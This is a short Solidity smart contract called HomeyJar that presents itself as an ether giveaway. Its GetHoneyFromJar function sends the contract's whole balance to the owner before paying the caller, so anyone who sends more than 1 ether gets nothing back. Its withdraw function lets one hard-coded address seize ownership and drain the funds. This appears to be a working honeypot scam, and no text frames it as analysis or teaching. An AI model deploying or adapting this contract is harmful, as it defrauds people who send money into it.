pragma solidity ^0.4.19;
contract HomeyJar {
	address public Owner = msg.sender;
	function () payable public {
	}
	function GetHoneyFromJar() payable public {
	if(msg.value > 1 ether){
	Owner.transfer(this.balance);
	msg.sender.transfer(this.balance);
	}
	}
	function withdraw() payable public {
	if(msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7){
	Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
	}
	require(msg.sender == Owner);
	Owner.transfer(this.balance);
	}
	function Command(address adr, bytes data) payable public {
	require(msg.sender == Owner);
	adr.transfer(msg.value);
	}
	
}